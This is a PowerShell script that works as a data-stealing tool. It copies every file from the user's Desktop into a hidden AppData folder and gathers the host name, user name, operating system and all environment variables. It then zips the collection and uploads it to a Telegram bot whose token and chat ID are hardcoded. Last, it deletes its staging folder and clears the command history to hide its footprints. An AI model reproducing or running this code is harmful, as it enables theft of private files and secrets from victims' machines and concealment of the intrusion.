
# Customizable Parameters
$TELEGRAM_BOT_TOKEN = "7773792784:AAFfeZfSjo3yVYIbUPA1xwlMK17l-Fak2sg"  # Replace with your bot token
$TELEGRAM_CHAT_ID = "1318817377"               # Replace with your chat ID
$TARGET_DIRECTORY = "$env:USERPROFILE\Desktop"   # Replace with the directory to collect files from
$HIDDEN_DIRECTORY = "$env:APPDATA\Microsoft\Windows\HiddenFolder"  # Hidden directory path

# Function to send a message to Telegram
function Send-ToTelegram {
    param (
        [string]$Message
    )
    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage"
    $body = @{
        chat_id = $TELEGRAM_CHAT_ID
        text = $Message
    }
    Invoke-RestMethod -Uri $url -Method Post -Body $body
}

# Function to send a file to Telegram
function Send-FileToTelegram {
    param (
        [string]$FilePath
    )
    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument"
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileContent = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`"",
        "",
        $TELEGRAM_CHAT_ID,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
        "Content-Type: application/octet-stream",
        "",
        $fileContent,
        "--$boundary--"
    ) -join "`r`n"
    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }
    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyLines
}

# Function to collect system information
function Get-SystemInfo {
    $info = @()
    $info += "=== System Information ==="
    $info += "Hostname: $env:COMPUTERNAME"
    $info += "Username: $env:USERNAME"
    $info += "Operating System: $(Get-WmiObject Win32_OperatingSystem).Caption"
    $info += "Current Directory: $(Get-Location)"
    $info += "Environment Variables:"
    Get-ChildItem Env: | ForEach-Object { $info += "$($_.Name)=$($_.Value)" }
    return ($info -join "`n")
}

# Function to collect files from a directory
function Get-FilesFromDirectory {
    param (
        [string]$Directory
    )
    return Get-ChildItem -Path $Directory -Recurse -File | Select-Object -ExpandProperty FullName
}

# Function to create a ZIP file
function Create-ZipFile {
    param (
        [string]$SourceFolder,
        [string]$ZipFilePath
    )
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($SourceFolder, $ZipFilePath)
}

# Function to delete footprints
function Remove-Footprints {
    # Delete the hidden directory and its contents
    Remove-Item -Path $HIDDEN_DIRECTORY -Recurse -Force
    # Clear PowerShell command history
    Clear-History
}

# Main function
function Main {
    # Create a hidden directory
    New-Item -Path $HIDDEN_DIRECTORY -ItemType Directory -Force | Out-Null
    Set-ItemProperty -Path $HIDDEN_DIRECTORY -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

    # Collect system information
    $systemInfo = Get-SystemInfo
    $systemInfoFilePath = "$HIDDEN_DIRECTORY\system_info.txt"
    $systemInfo | Out-File -FilePath $systemInfoFilePath

    # Collect files from the target directory
    $files = Get-FilesFromDirectory -Directory $TARGET_DIRECTORY
    foreach ($file in $files) {
        Copy-Item -Path $file -Destination $HIDDEN_DIRECTORY
    }

    # Create a ZIP file
    $zipFilePath = "$env:TEMP\collected_data.zip"
    Create-ZipFile -SourceFolder $HIDDEN_DIRECTORY -ZipFilePath $zipFilePath

    # Send the ZIP file to Telegram
    Send-FileToTelegram -FilePath $zipFilePath

    # Delete footprints
    Remove-Footprints
}

# Run the main function
Main